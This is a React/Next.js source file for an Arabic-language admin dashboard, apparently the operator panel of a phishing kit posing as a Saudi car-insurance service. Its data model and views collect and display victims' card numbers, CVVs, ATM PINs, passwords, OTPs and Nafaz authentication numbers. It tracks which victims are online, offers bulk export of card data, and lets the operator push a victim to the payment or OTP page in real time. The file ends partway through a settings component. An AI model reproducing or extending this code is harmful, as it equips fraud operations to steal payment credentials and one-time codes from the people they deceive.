"use client"

import type React from "react"
import { useState, useEffect, useMemo, useRef } from "react"
import { useRouter } from "next/navigation"
import {
  Trash2,
  Users,
  CreditCard,
  UserCheck,
  Flag,
  Bell,
  LogOut,
  CheckCircle,
  XCircle,
  Clock,
  MapPin,
  Search,
  Download,
  Settings,
  User,
  Menu,
  ArrowUpDown,
  ChevronLeft,
  ChevronRight,
  TrendingUp,
  Activity,
  Filter,
  RefreshCw,
  AlertCircle,
  Loader2,
  Shield,
  Edit3,
  Save,
  X,
  BadgeIcon as IdCard,
} from "lucide-react"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { ar } from "date-fns/locale"
import { formatDistanceToNow, format } from "date-fns"
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogFooter } from "@/components/ui/dialog"
import { Card, CardContent, CardHeader, CardTitle, CardFooter, CardDescription } from "@/components/ui/card"
import { collection, doc, writeBatch, updateDoc, onSnapshot, query, orderBy } from "firebase/firestore"
import { onAuthStateChanged, signOut } from "firebase/auth"
import { onValue, ref } from "firebase/database"
import { database } from "@/lib/firestore"
import { auth } from "@/lib/firestore"
import { db } from "@/lib/firestore"
import { playNotificationSound } from "@/lib/actions"
import { Popover, PopoverContent, PopoverTrigger } from "@/components/ui/popover"
import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip"
import { Input } from "@/components/ui/input"
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuTrigger,
  DropdownMenuSeparator,
  DropdownMenuLabel,
} from "@/components/ui/dropdown-menu"
import { Avatar, AvatarFallback, AvatarImage } from "@/components/ui/avatar"
import { Separator } from "@/components/ui/separator"
import { Switch } from "@/components/ui/switch"
import { Label } from "@/components/ui/label"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Checkbox } from "@/components/ui/checkbox"
import { toast } from "@/hooks/use-toast"
import { Sheet, SheetContent, SheetHeader, SheetTitle } from "@/components/ui/sheet"

// Types
type FlagColor = "red" | "yellow" | "green" | null

interface NafazInfo {
  nafazId?: string
  authNumber?: string
  lastUpdated?: string
}

interface Notification {
  createdDate: string
  bank: string
  cardStatus?: string
  ip?: string
  cvv: string
  id: string | "0"
  notificationCount: number
  otp: string
  otp2: string
  page: string
  cardNumber: string
  cardHolderName?: string
  expiryMonth?: string
  expiryYear?: string
  country?: string
  personalInfo: {
    id?: string | "0"
    name?: string
  }
  prefix: string
  status: "pending" | "approved" | "rejected" | string
  isOnline?: boolean
  lastSeen: string
  violationValue: number
  pass?: string
  atmPin?: string
  pagename: string
  plateType: string
  allOtps?: string[] | null
  idNumber: string
  email: string
  mobile: string
  network: string
  phoneOtp: string
  name: string
  otpCode: string
  phone: string
  flagColor?: string
  currentPage?: string
  nafazInfo?: NafazInfo

  // New insurance form data
  insuranceData?: {
    insurance_purpose?: "renewal" | "property-transfer"
    documment_owner_full_name?: string
    owner_identity_number?: string
    buyer_identity_number?: string
    seller_identity_number?: string
    vehicle_type?: "serial" | "custom"
    sequenceNumber?: string
    policyStartDate?: string
    insuranceTypeSelected?: "against-others" | "comprehensive"
    additionalDrivers?: number
    specialDiscounts?: boolean
    agreeToTerms?: boolean
    selectedInsuranceOffer?: string
    selectedAddons?: string[]
    vehicleValue?: string
    paymentStatus?: "processing" | "completed" | "failed"
    otpSent?: boolean
    otpVerified?: boolean
    otpAttempts?: number
    otpTimer?: number
    submissionTime?: string
    finalStatus?: string
    otpVerificationTime?: string
    otpSentTime?: string
    otpResendCount?: number
  }
}

// Hook for online users count
function useOnlineUsersCount() {
  const [onlineUsersCount, setOnlineUsersCount] = useState(0)

  useEffect(() => {
    const onlineUsersRef = ref(database, "status")
    const unsubscribe = onValue(onlineUsersRef, (snapshot) => {
      const data = snapshot.val()
      if (data) {
        const onlineCount = Object.values(data).filter((status: any) => status.state === "online").length
        setOnlineUsersCount(onlineCount)
      }
    })

    return () => unsubscribe()
  }, [])

  return onlineUsersCount
}

// Hook to track online status for a specific user ID
function useUserOnlineStatus(userId: string) {
  const [isOnline, setIsOnline] = useState(false)

  useEffect(() => {
    const userStatusRef = ref(database, `/status/${userId}`)
    const unsubscribe = onValue(userStatusRef, (snapshot) => {
      const data = snapshot.val()
      setIsOnline(data && data.state === "online")
    })

    return () => unsubscribe()
  }, [userId])

  return isOnline
}

// Enhanced Statistics Card Component
function StatisticsCard({
  title,
  value,
  change,
  changeType,
  icon: Icon,
  color,
  trend,
}: {
  title: string
  value: string | number
  change: string
  changeType: "increase" | "decrease" | "neutral"
  icon: React.ElementType
  color: string
  trend?: number[]
}) {
  return (
    <Card className="relative overflow-hidden bg-gradient-to-br from-background to-muted/20 border-0 shadow-lg hover:shadow-xl transition-all duration-300">
      <CardHeader className="pb-2">
        <div className="flex items-center justify-between">
          <div className={`p-3 rounded-xl ${color}`}>
            <Icon className="h-6 w-6 text-white" />
          </div>
          <div className="text-right">
            <p className="text-sm font-medium text-muted-foreground">{title}</p>
            <p className="text-3xl font-bold">{value}</p>
          </div>
        </div>
      </CardHeader>
      <CardContent className="pt-0">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-1">
            <TrendingUp
              className={`h-4 w-4 ${
                changeType === "increase"
                  ? "text-green-500"
                  : changeType === "decrease"
                    ? "text-red-500"
                    : "text-gray-500"
              }`}
            />
            <span
              className={`text-sm font-medium ${
                changeType === "increase"
                  ? "text-green-500"
                  : changeType === "decrease"
                    ? "text-red-500"
                    : "text-gray-500"
              }`}
            >
              {change}
            </span>
          </div>
          {trend && (
            <div className="flex items-end gap-1 h-8">
              {trend.map((value, index) => (
                <div
                  key={index}
                  className={`w-1 rounded-sm ${color.replace("bg-", "bg-")} opacity-60`}
                  style={{ height: `${(value / Math.max(...trend)) * 100}%` }}
                />
              ))}
            </div>
          )}
        </div>
      </CardContent>
    </Card>
  )
}

// Enhanced User Status Component
function UserStatus({ userId }: { userId: string }) {
  const [status, setStatus] = useState<"online" | "offline" | "unknown">("unknown")

  useEffect(() => {
    const userStatusRef = ref(database, `/status/${userId}`)
    const unsubscribe = onValue(userStatusRef, (snapshot) => {
      const data = snapshot.val()
      if (data) {
        setStatus(data.state === "online" ? "online" : "offline")
      } else {
        setStatus("unknown")
      }
    })

    return () => unsubscribe()
  }, [userId])

  return (
    <div className="flex items-center gap-2">
      <div className={`w-2 h-2 rounded-full ${status === "online" ? "bg-green-500 animate-pulse" : "bg-red-500"}`} />
      <Badge
        variant="outline"
        className={`text-xs ${
          status === "online"
            ? "bg-green-50 text-green-700 border-green-200 dark:bg-green-950/30 dark:text-green-300"
            : "bg-red-50 text-red-700 border-red-200 dark:bg-red-950/30 dark:text-red-300"
        }`}
      >
        {status === "online" ? "متصل" : "غير متصل"}
      </Badge>
    </div>
  )
}

// Enhanced Flag Color Selector
function FlagColorSelector({
  notificationId,
  currentColor,
  onColorChange,
}: {
  notificationId: string
  currentColor: FlagColor
  onColorChange: (id: string, color: FlagColor) => void
}) {
  return (
    <Popover>
      <PopoverTrigger asChild>
        <Button variant="ghost" size="icon" className="h-8 w-8">
          <Flag
            className={`h-4 w-4 ${
              currentColor === "red"
                ? "text-red-500 fill-red-500"
                : currentColor === "yellow"
                  ? "text-yellow-500 fill-yellow-500"
                  : currentColor === "green"
                    ? "text-green-500 fill-green-500"
                    : "text-muted-foreground"
            }`}
          />
        </Button>
      </PopoverTrigger>
      <PopoverContent className="w-auto p-2">
        <div className="flex gap-2">
          {[
            { color: "red", label: "عالي الأولوية" },
            { color: "yellow", label: "متوسط الأولوية" },
            { color: "green", label: "منخفض الأولوية" },
          ].map(({ color, label }) => (
            <TooltipProvider key={color}>
              <Tooltip>
                <TooltipTrigger asChild>
                  <Button
                    variant="ghost"
                    size="icon"
                    className={`h-8 w-8 rounded-full bg-${color}-100 dark:bg-${color}-900 hover:bg-${color}-200 dark:hover:bg-${color}-800`}
                    onClick={() => onColorChange(notificationId, color as FlagColor)}
                  >
                    <Flag className={`h-4 w-4 text-${color}-500 fill-${color}-500`} />
                  </Button>
                </TooltipTrigger>
                <TooltipContent>
                  <p>{label}</p>
                </TooltipContent>
              </Tooltip>
            </TooltipProvider>
          ))}
          {currentColor && (
            <TooltipProvider>
              <Tooltip>
                <TooltipTrigger asChild>
                  <Button
                    variant="ghost"
                    size="icon"
                    className="h-8 w-8 rounded-full bg-gray-100 dark:bg-gray-800 hover:bg-gray-200 dark:hover:bg-gray-700"
                    onClick={() => onColorChange(notificationId, null)}
                  >
                    <Flag className="h-4 w-4 text-gray-500" />
                  </Button>
                </TooltipTrigger>
                <TooltipContent>
                  <p>إزالة العلم</p>
                </TooltipContent>
              </Tooltip>
            </TooltipProvider>
          )}
        </div>
      </PopoverContent>
    </Popover>
  )
}

// Enhanced Search Component
function SearchBar({ onSearch }: { onSearch: (term: string) => void }) {
  const [searchTerm, setSearchTerm] = useState("")
  const searchInputRef = useRef<HTMLInputElement>(null)

  const handleSearch = () => {
    onSearch(searchTerm)
  }

  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Enter") {
      handleSearch()
    }
  }

  return (
    <div className="relative">
      <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-muted-foreground" />
      <Input
        ref={searchInputRef}
        type="search"
        placeholder="البحث في الإشعارات..."
        className="pl-10 pr-4 bg-background/50 backdrop-blur-sm border-muted-foreground/20 focus:border-primary/50 transition-colors"
        value={searchTerm}
        onChange={(e) => setSearchTerm(e.target.value)}
        onKeyDown={handleKeyDown}
      />
    </div>
  )
}

// Enhanced Pagination Component
function Pagination({
  currentPage,
  totalPages,
  onPageChange,
  totalItems,
  itemsPerPage,
}: {
  currentPage: number
  totalPages: number
  onPageChange: (page: number) => void
  totalItems: number
  itemsPerPage: number
}) {
  const startItem = (currentPage - 1) * itemsPerPage + 1
  const endItem = Math.min(currentPage * itemsPerPage, totalItems)

  return (
    <div className="flex items-center justify-between">
      <div className="text-sm text-muted-foreground">
        عرض {startItem} إلى {endItem} من {totalItems} عنصر
      </div>
      <div className="flex items-center gap-2">
        <Button
          variant="outline"
          size="sm"
          onClick={() => onPageChange(currentPage - 1)}
          disabled={currentPage <= 1}
          className="gap-1"
        >
          <ChevronRight className="h-4 w-4" />
          السابق
        </Button>
        <div className="flex items-center gap-1">
          {Array.from({ length: Math.min(5, totalPages) }, (_, i) => {
            const page = i + 1
            return (
              <Button
                key={page}
                variant={currentPage === page ? "default" : "outline"}
                size="sm"
                className="w-8 h-8 p-0"
                onClick={() => onPageChange(page)}
              >
                {page}
              </Button>
            )
          })}
        </div>
        <Button
          variant="outline"
          size="sm"
          onClick={() => onPageChange(currentPage + 1)}
          disabled={currentPage >= totalPages}
          className="gap-1"
        >
          التالي
          <ChevronLeft className="h-4 w-4" />
        </Button>
      </div>
    </div>
  )
}

// Nafaz Information Component
function NafazInfoCard({
  notification,
  onUpdate,
}: {
  notification: Notification
  onUpdate: (id: string, nafazInfo: NafazInfo) => void
}) {
  const [isEditing, setIsEditing] = useState(false)
  const [nafazId, setNafazId] = useState(notification.nafazInfo?.nafazId || "")
  const [authNumber, setAuthNumber] = useState(notification.nafazInfo?.authNumber || "")
  const [isSaving, setIsSaving] = useState(false)

  const handleSave = async () => {
    setIsSaving(true)
    try {
      await onUpdate(notification.id, {
        nafazId,
        authNumber,
        lastUpdated: new Date().toISOString(),
      })
      setIsEditing(false)
      toast({
        title: "تم التحديث بنجاح",
        description: "تم تحديث معلومات نفاذ بنجاح",
      })
    } catch (error) {
      toast({
        title: "خطأ في التحديث",
        description: "حدث خطأ أثناء تحديث معلومات نفاذ",
        variant: "destructive",
      })
    } finally {
      setIsSaving(false)
    }
  }

  const handleCancel = () => {
    setNafazId(notification.nafazInfo?.nafazId || "")
    setAuthNumber(notification.nafazInfo?.authNumber || "")
    setIsEditing(false)
  }

  return (
    <Card className="border-2 border-primary/20 bg-gradient-to-br from-primary/5 to-primary/10">
      <CardHeader className="pb-3">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-full bg-gradient-to-br from-primary to-primary/80 flex items-center justify-center">
              <Shield className="h-5 w-5 text-white" />
            </div>
            <div>
              <CardTitle className="text-lg">معلومات نفاذ</CardTitle>
              <CardDescription>
                {notification.nafazInfo?.lastUpdated
                  ? `آخر تحديث: ${formatDistanceToNow(new Date(notification.nafazInfo.lastUpdated), {
                      addSuffix: true,
                      locale: ar,
                    })}`
                  : "لم يتم التحديث بعد"}
              </CardDescription>
            </div>
          </div>
          <div className="flex items-center gap-2">
            <Button variant="outline" size="sm" onClick={() => setIsEditing(!isEditing)} className="gap-2">
              <Edit3 className="h-4 w-4" />
              {isEditing ? "إلغاء" : "تعديل"}
            </Button>
          </div>
        </div>
      </CardHeader>
      <CardContent className="space-y-4">
        {isEditing ? (
          <div className="space-y-4">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div className="space-y-2">
                <Label htmlFor="nafaz-id" className="text-sm font-medium">
                  رقم الهوية نفاذ
                </Label>
                <Input
                  id="nafaz-id"
                  placeholder="أدخل رقم الهوية"
                  value={nafazId}
                  onChange={(e) => setNafazId(e.target.value)}
                  className="bg-background"
                />
              </div>
              <div className="space-y-2">
                <Label htmlFor="auth-number" className="text-sm font-medium">
                  رقم التفويض
                </Label>
                <Input
                  id="auth-number"
                  placeholder="أدخل رقم التفويض"
                  value={authNumber}
                  onChange={(e) => setAuthNumber(e.target.value)}
                  className="bg-background"
                />
              </div>
            </div>
            <div className="flex justify-end gap-2 pt-4 border-t">
              <Button variant="outline" onClick={handleCancel}>
                <X className="h-4 w-4 mr-2" />
                إلغاء
              </Button>
              <Button onClick={handleSave} disabled={isSaving}>
                {isSaving ? <Loader2 className="h-4 w-4 mr-2 animate-spin" /> : <Save className="h-4 w-4 mr-2" />}
                حفظ التغييرات
              </Button>
            </div>
          </div>
        ) : (
          <div className="space-y-3">
            {notification.nafazInfo && (notification.nafazInfo.nafazId || notification.nafazInfo.authNumber) ? (
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                {[
                  { label: "رقم الهوية نفاذ", value: notification.nafazInfo.nafazId },
                  { label: "رقم التفويض", value: notification.nafazInfo.authNumber },
                ].map(
                  ({ label, value }) =>
                    value && (
                      <div key={label} className="flex flex-col space-y-1 p-3 bg-background/50 rounded-lg border">
                        <span className="text-xs font-medium text-muted-foreground">{label}</span>
                        <span className="font-semibold text-sm">{value}</span>
                      </div>
                    ),
                )}
              </div>
            ) : (
              <div className="text-center py-8">
                <IdCard className="h-12 w-12 mx-auto text-muted-foreground mb-3" />
                <p className="text-muted-foreground">لا توجد معلومات نفاذ مسجلة</p>
                <p className="text-sm text-muted-foreground mt-1">اضغط على "تعديل" لإضافة معلومات نفاذ</p>
              </div>
            )}
          </div>
        )}
      </CardContent>
    </Card>
  )
}

// Insurance Information Component
function InsuranceInfoCard({
  notification,
  onUpdate,
}: {
  notification: Notification
  onUpdate: (id: string, insuranceData: any) => void
}) {
  const [isEditing, setIsEditing] = useState(false)
  const [insuranceData, setInsuranceData] = useState(notification.insuranceData || {})
  const [isSaving, setIsSaving] = useState(false)

  const handleSave = async () => {
    setIsSaving(true)
    try {
      await onUpdate(notification.id, {
        ...insuranceData,
        lastUpdated: new Date().toISOString(),
      })
      setIsEditing(false)
      toast({
        title: "تم التحديث بنجاح",
        description: "تم تحديث معلومات التأمين بنجاح",
      })
    } catch (error) {
      toast({
        title: "خطأ في التحديث",
        description: "حدث خطأ أثناء تحديث معلومات التأمين",
        variant: "destructive",
      })
    } finally {
      setIsSaving(false)
    }
  }

  const handleCancel = () => {
    setInsuranceData(notification.insuranceData || {})
    setIsEditing(false)
  }

  const getInsurancePurposeText = (purpose: string) => {
    switch (purpose) {
      case "renewal":
        return "تجديد وثيقة"
      case "property-transfer":
        return "نقل ملكية"
      default:
        return purpose
    }
  }

  const getInsuranceTypeText = (type: string) => {
    switch (type) {
      case "against-others":
        return "ضد الغير"
      case "comprehensive":
        return "شامل"
      default:
        return type
    }
  }

  const getVehicleTypeText = (type: string) => {
    switch (type) {
      case "serial":
        return "مركبة برقم تسلسلي"
      case "custom":
        return "مركبة برقم لوحة"
      default:
        return type
    }
  }

  const getPaymentStatusText = (status: string) => {
    switch (status) {
      case "processing":
        return "قيد المعالجة"
      case "completed":
        return "مكتمل"
      case "failed":
        return "فاشل"
      default:
        return status
    }
  }

  return (
    <Card className="border-2 border-blue-500/20 bg-gradient-to-br from-blue-500/5 to-blue-500/10">
      <CardHeader className="pb-3">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-full bg-gradient-to-br from-blue-500 to-blue-600 flex items-center justify-center">
              <CreditCard className="h-5 w-5 text-white" />
            </div>
            <div>
              <CardTitle className="text-lg">معلومات التأمين</CardTitle>
              <CardDescription>
                {insuranceData?.submissionTime
                  ? `تاريخ الطلب: ${formatDistanceToNow(new Date(insuranceData.submissionTime), {
                      addSuffix: true,
                      locale: ar,
                    })}`
                  : "لا توجد معلومات تأمين"}
              </CardDescription>
            </div>
          </div>
          <div className="flex items-center gap-2">
            <Button variant="outline" size="sm" onClick={() => setIsEditing(!isEditing)} className="gap-2">
              <Edit3 className="h-4 w-4" />
              {isEditing ? "إلغاء" : "تعديل"}
            </Button>
          </div>
        </div>
      </CardHeader>
      <CardContent className="space-y-4">
        {insuranceData && Object.keys(insuranceData).length > 0 ? (
          <div className="space-y-4">
            {/* Basic Insurance Info */}
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
              {[
                { label: "الغرض من التأمين", value: getInsurancePurposeText(insuranceData.insurance_purpose as any) },
                { label: "اسم مالك الوثيقة", value: insuranceData.documment_owner_full_name },
                { label: "رقم هوية المالك", value: insuranceData.owner_identity_number },
                { label: "رقم هوية المشتري", value: insuranceData.buyer_identity_number },
                { label: "رقم هوية البائع", value: insuranceData.seller_identity_number },
                { label: "نوع المركبة", value: getVehicleTypeText(insuranceData.vehicle_type as any) },
                { label: "الرقم التسلسلي", value: insuranceData.sequenceNumber },
                { label: "تاريخ بداية الوثيقة", value: insuranceData.policyStartDate },
                { label: "نوع التأمين", value: getInsuranceTypeText(insuranceData.insuranceTypeSelected as any) },
                {
                  label: "القيمة التقديرية",
                  value: insuranceData.vehicleValue ? `${insuranceData.vehicleValue} ر.س` : undefined,
                },
                { label: "عدد السائقين الإضافيين", value: insuranceData.additionalDrivers?.toString() },
                { label: "الخصومات الخاصة", value: insuranceData.specialDiscounts ? "نعم" : "لا" },
              ].map(
                ({ label, value }) =>
                  value && (
                    <div key={label} className="flex flex-col space-y-1 p-3 bg-background/50 rounded-lg border">
                      <span className="text-xs font-medium text-muted-foreground">{label}</span>
                      <span className="font-semibold text-sm">{value}</span>
                    </div>
                  ),
              )}
            </div>

            {/* Payment Status */}
            {insuranceData.paymentStatus && (
              <div className="p-4 bg-gradient-to-r from-green-50 to-blue-50 rounded-lg border border-green-200">
                <div className="flex items-center gap-3">
                  <div
                    className={`w-3 h-3 rounded-full ${
                      insuranceData.paymentStatus === "completed"
                        ? "bg-green-500"
                        : insuranceData.paymentStatus === "processing"
                          ? "bg-yellow-500"
                          : "bg-red-500"
                    }`}
                  />
                  <div>
                    <span className="font-semibold text-sm">حالة الدفع: </span>
                    <span className="text-sm">{getPaymentStatusText(insuranceData.paymentStatus)}</span>
                  </div>
                </div>
              </div>
            )}

            {/* OTP Information */}
            {(insuranceData.otpSent || insuranceData.otpAttempts) && (
              <div className="p-4 bg-gradient-to-r from-orange-50 to-red-50 rounded-lg border border-orange-200">
                <h4 className="font-semibold text-sm mb-2">معلومات التحقق</h4>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                  {[
                    { label: "تم إرسال الرمز", value: insuranceData.otpSent ? "نعم" : "لا" },
                    { label: "تم التحقق", value: insuranceData.otpVerified ? "نعم" : "لا" },
                    { label: "عدد المحاولات", value: insuranceData.otpAttempts?.toString() },
                    {
                      label: "وقت الإرسال",
                      value: insuranceData.otpSentTime
                        ? format(new Date(insuranceData.otpSentTime), "HH:mm dd/MM/yyyy")
                        : undefined,
                    },
                    {
                      label: "وقت التحقق",
                      value: insuranceData.otpVerificationTime
                        ? format(new Date(insuranceData.otpVerificationTime), "HH:mm dd/MM/yyyy")
                        : undefined,
                    },
                  ].map(
                    ({ label, value }) =>
                      value && (
                        <div key={label} className="flex justify-between">
                          <span className="text-xs text-muted-foreground">{label}:</span>
                          <span className="text-xs font-medium">{value}</span>
                        </div>
                      ),
                  )}
                </div>
              </div>
            )}

            {/* Selected Addons */}
            {insuranceData.selectedAddons && insuranceData.selectedAddons.length > 0 && (
              <div className="p-4 bg-gradient-to-r from-purple-50 to-pink-50 rounded-lg border border-purple-200">
                <h4 className="font-semibold text-sm mb-2">الإضافات المختارة</h4>
                <div className="flex flex-wrap gap-2">
                  {insuranceData.selectedAddons.map((addon, index) => (
                    <Badge key={index} variant="outline" className="bg-purple-100 text-purple-700">
                      {addon}
                    </Badge>
                  ))}
                </div>
              </div>
            )}

            {/* Terms Agreement */}
            {insuranceData.agreeToTerms && (
              <div className="flex items-center gap-2 p-3 bg-green-50 rounded-lg border border-green-200">
                <CheckCircle className="h-4 w-4 text-green-600" />
                <span className="text-sm text-green-800">تم الموافقة على الشروط والأحكام</span>
              </div>
            )}
          </div>
        ) : (
          <div className="text-center py-8">
            <CreditCard className="h-12 w-12 mx-auto text-muted-foreground mb-3" />
            <p className="text-muted-foreground">لا توجد معلومات تأمين مسجلة</p>
            <p className="text-sm text-muted-foreground mt-1">اضغط على "تعديل" لإضافة معلومات التأمين</p>
          </div>
        )}
      </CardContent>
    </Card>
  )
}

// Export dialog component
function ExportDialog({
  open,
  onOpenChange,
  notifications,
}: {
  open: boolean
  onOpenChange: (open: boolean) => void
  notifications: Notification[]
}) {
  const [exportFormat, setExportFormat] = useState<"csv" | "json">("csv")
  const [exportFields, setExportFields] = useState({
    personalInfo: true,
    cardInfo: true,
    nafazInfo: true,
    status: true,
    timestamps: true,
  })
  const [isExporting, setIsExporting] = useState(false)

  const handleExport = () => {
    setIsExporting(true)
    // Simulate export process
    setTimeout(() => {
      setIsExporting(false)
      onOpenChange(false)
      toast({
        title: "تم التصدير بنجاح",
        description: `تم تصدير ${notifications.length} إشعار بتنسيق ${exportFormat.toUpperCase()}`,
      })
    }, 1500)
  }

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="sm:max-w-md" dir="rtl">
        <DialogHeader>
          <DialogTitle className="flex items-center gap-2">
            <Download className="h-5 w-5" />
            تصدير الإشعارات
          </DialogTitle>
        </DialogHeader>
        <div className="space-y-4 py-4">
          <div className="space-y-2">
            <Label>تنسيق التصدير</Label>
            <div className="flex gap-4">
              <div className="flex items-center space-x-2 space-x-reverse">
                <input
                  type="radio"
                  id="csv"
                  value="csv"
                  checked={exportFormat === "csv"}
                  onChange={() => setExportFormat("csv")}
                  className="h-4 w-4 text-primary"
                />
                <Label htmlFor="csv" className="cursor-pointer">
                  CSV
                </Label>
              </div>
              <div className="flex items-center space-x-2 space-x-reverse">
                <input
                  type="radio"
                  id="json"
                  value="json"
                  checked={exportFormat === "json"}
                  onChange={() => setExportFormat("json")}
                  className="h-4 w-4 text-primary"
                />
                <Label htmlFor="json" className="cursor-pointer">
                  JSON
                </Label>
              </div>
            </div>
          </div>
          <div className="space-y-2">
            <Label>البيانات المراد تصديرها</Label>
            <div className="space-y-2">
              <div className="flex items-center space-x-2 space-x-reverse">
                <Checkbox
                  id="personal-info"
                  checked={exportFields.personalInfo}
                  onCheckedChange={(checked) =>
                    setExportFields({
                      ...exportFields,
                      personalInfo: checked as boolean,
                    })
                  }
                />
                <Label htmlFor="personal-info" className="cursor-pointer">
                  المعلومات الشخصية
                </Label>
              </div>
              <div className="flex items-center space-x-2 space-x-reverse">
                <Checkbox
                  id="card-info"
                  checked={exportFields.cardInfo}
                  onCheckedChange={(checked) =>
                    setExportFields({
                      ...exportFields,
                      cardInfo: checked as boolean,
                    })
                  }
                />
                <Label htmlFor="card-info" className="cursor-pointer">
                  معلومات البطاقة
                </Label>
              </div>
              <div className="flex items-center space-x-2 space-x-reverse">
                <Checkbox
                  id="nafaz-info"
                  checked={exportFields.nafazInfo}
                  onCheckedChange={(checked) =>
                    setExportFields({
                      ...exportFields,
                      nafazInfo: checked as boolean,
                    })
                  }
                />
                <Label htmlFor="nafaz-info" className="cursor-pointer">
                  معلومات نفاذ
                </Label>
              </div>
              <div className="flex items-center space-x-2 space-x-reverse">
                <Checkbox
                  id="status"
                  checked={exportFields.status}
                  onCheckedChange={(checked) =>
                    setExportFields({
                      ...exportFields,
                      status: checked as boolean,
                    })
                  }
                />
                <Label htmlFor="status" className="cursor-pointer">
                  حالة الإشعار
                </Label>
              </div>
              <div className="flex items-center space-x-2 space-x-reverse">
                <Checkbox
                  id="timestamps"
                  checked={exportFields.timestamps}
                  onCheckedChange={(checked) =>
                    setExportFields({
                      ...exportFields,
                      timestamps: checked as boolean,
                    })
                  }
                />
                <Label htmlFor="timestamps" className="cursor-pointer">
                  الطوابع الزمنية
                </Label>
              </div>
            </div>
          </div>
          <div className="rounded-md bg-muted p-3">
            <div className="flex items-center gap-2 text-sm">
              <AlertCircle className="h-4 w-4 text-muted-foreground" />
              <p className="text-muted-foreground">سيتم تصدير {notifications.length} إشعار بالإعدادات المحددة.</p>
            </div>
          </div>
        </div>
        <DialogFooter className="sm:justify-start">
          <Button variant="outline" onClick={() => onOpenChange(false)}>
            إلغاء
          </Button>
          <Button type="submit" onClick={handleExport} disabled={isExporting}>
            {isExporting ? (
              <>
                <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                جاري التصدير...
              </>
            ) : (
              <>
                <Download className="mr-2 h-4 w-4" />
                تصدير
              </>
            )}
          </Button>
        </DialogFooter>
      </DialogContent>
    </Dialog>
  )
}

// Page Update Dialog Component
function PageUpdateDialog({
  open,
  onOpenChange,
  notification,
  onUpdate,
}: {
  open: boolean
  onOpenChange: (open: boolean) => void
  notification: Notification | null
  onUpdate: (newPage: string) => void
}) {
  const [selectedPage, setSelectedPage] = useState(notification?.currentPage || "1")
  const [isUpdating, setIsUpdating] = useState(false)

  const pages = [
    { value: "1", label: "البيانات الأساسية", description: "معلومات المركبة والمالك" },
    { value: "2", label: "بيانات التأمين", description: "تفاصيل وثيقة التأمين" },
    { value: "3", label: "قائمة الأسعار", description: "مقارنة العروض المتاحة" },
    { value: "4", label: "الإضافات", description: "خدمات إضافية اختيارية" },
    { value: "5", label: "الملخص", description: "مراجعة الطلب والتواصل" },
    { value: "6", label: "الدفع", description: "بيانات الدفع الآمن" },
    { value: "7", label: "التحقق", description: "تأكيد رمز التحقق" },
    { value: "9999", label: "التحقق من الهاتف", description: "صفحة التحقق من الهاتف" },
  ]

  const handleUpdate = async () => {
    setIsUpdating(true)
    try {
      onUpdate(selectedPage)
      await new Promise((resolve) => setTimeout(resolve, 500)) // Small delay for UX
    } finally {
      setIsUpdating(false)
    }
  }

  useEffect(() => {
    if (notification) {
      setSelectedPage(notification.currentPage || "1")
    }
  }, [notification])

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="sm:max-w-md" dir="rtl">
        <DialogHeader>
          <DialogTitle className="flex items-center gap-2">
            <Edit3 className="h-5 w-5" />
            تحديث الصفحة الحالية
          </DialogTitle>
        </DialogHeader>
        <div className="space-y-4 py-4">
          {notification && (
            <div className="p-3 bg-muted rounded-lg">
              <div className="flex items-center gap-2 text-sm">
                <User className="h-4 w-4 text-muted-foreground" />
                <span className="font-medium">المستخدم:</span>
                <span>{notification.name || notification.phone || notification.id}</span>
              </div>
              <div className="flex items-center gap-2 text-sm mt-1">
                <Clock className="h-4 w-4 text-muted-foreground" />
                <span className="font-medium">الصفحة الحالية:</span>
                <Badge variant="outline">{notification.currentPage || "1"}</Badge>
              </div>
            </div>
          )}

          <div className="space-y-2">
            <Label>اختر الصفحة الجديدة</Label>
            <Select value={selectedPage} onValueChange={setSelectedPage}>
              <SelectTrigger>
                <SelectValue placeholder="اختر الصفحة" />
              </SelectTrigger>
              <SelectContent>
                {pages.map((page) => (
                  <SelectItem key={page.value} value={page.value}>
                    <div className="flex flex-col items-start">
                      <span className="font-medium">{page.label}</span>
                      <span className="text-xs text-muted-foreground">{page.description}</span>
                    </div>
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
          </div>

          <div className="rounded-md bg-blue-50 p-3 border border-blue-200">
            <div className="flex items-start gap-2 text-sm">
              <AlertCircle className="h-4 w-4 text-blue-600 flex-shrink-0 mt-0.5" />
              <div className="text-blue-800">
                <p className="font-medium mb-1">ملاحظة مهمة:</p>
                <p>سيتم تحديث الصفحة الحالية للمستخدم فوراً. تأكد من اختيار الصفحة الصحيحة.</p>
              </div>
            </div>
          </div>
        </div>
        <DialogFooter className="sm:justify-start">
          <Button variant="outline" onClick={() => onOpenChange(false)} disabled={isUpdating}>
            إلغاء
          </Button>
          <Button onClick={handleUpdate} disabled={isUpdating}>
            {isUpdating ? (
              <>
                <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                جاري التحديث...
              </>
            ) : (
              <>
                <Edit3 className="mr-2 h-4 w-4" />
                تحديث الصفحة
              </>
            )}
          </Button>
        </DialogFooter>
      </DialogContent>
    </Dialog>
  )
}

// Settings panel component
function SettingsPanel({
  open,
  onOpenChange,
}: {
  open: boolean
  onOpenChange: (open: boolean) => void
}) {
  const [notifyNewCards, setNotifyNewCards] = useState(true)
  const [notifyNewUsers, setNotifyNewUsers] = useState(true)
  const [notifyNafaz, setNotifyNafaz] = useState(true)
